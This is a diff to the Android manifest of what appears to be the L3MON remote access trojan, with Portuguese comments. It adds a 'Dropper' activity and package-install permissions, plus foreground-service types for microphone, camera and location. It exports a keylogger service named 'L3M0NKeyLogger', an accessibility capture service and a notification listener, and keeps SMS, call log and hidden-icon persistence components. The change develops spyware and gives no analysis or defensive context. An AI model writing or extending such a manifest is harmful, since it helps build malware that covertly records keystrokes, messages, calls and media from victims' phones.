@@ -6,16 +6,34 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- Permissões adicionais (mantidas do original) -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
+
+    <!-- Permissões adicionais mantidas -->
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
+
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -45,24 +63,38 @@
             </intent-filter>
         </activity>
 
-        <!-- ==================== SERVICES ==================== -->
+        <!-- Nova atividade para o Dropper -->
+        <activity android:name=".Dropper" />
+
+        <!-- Provider -->
+        <provider
+            android:name="android.support.v4.content.FileProvider"
+            android:authorities="${applicationId}.provider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+        <!-- Services -->
         <service
             android:name=".MainService"
             android:enabled="true"
             android:exported="false"
+            android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
-        <!-- Serviço de Persistência (Hide Icon + Foreground) -->
         <service
             android:name=".AccessibilityCaptureService$HideIconBackgroundService"
             android:enabled="true"
-            android:exported="false" />
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
 
-        <!-- Accessibility Services -->
         <service
             android:name=".AccessibilityCaptureService"
             android:enabled="true"
-            android:exported="false"
+            android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -75,7 +107,7 @@
         <service
             android:name=".L3M0NKeyLogger"
             android:enabled="true"
-            android:exported="false"
+            android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -85,8 +117,7 @@
                 android:resource="@xml/l3mon_accessibility_config" />
         </service>
 
-        <!-- ==================== RECEIVERS ==================== -->
-        <!-- Boot Receiver (Melhorado) -->
+        <!-- Receivers -->
         <receiver
             android:name=".MyReceiver"
             android:enabled="true"
@@ -98,7 +129,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Service Respawn Receiver -->
         <receiver
             android:name=".ServiceReciever"
             android:enabled="true"
@@ -108,10 +138,10 @@
             </intent-filter>
         </receiver>
 
-        <!-- Outros serviços -->
         <service
             android:name=".NotificationListener"
             android:label="@string/app_name"
+            android:exported="true"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
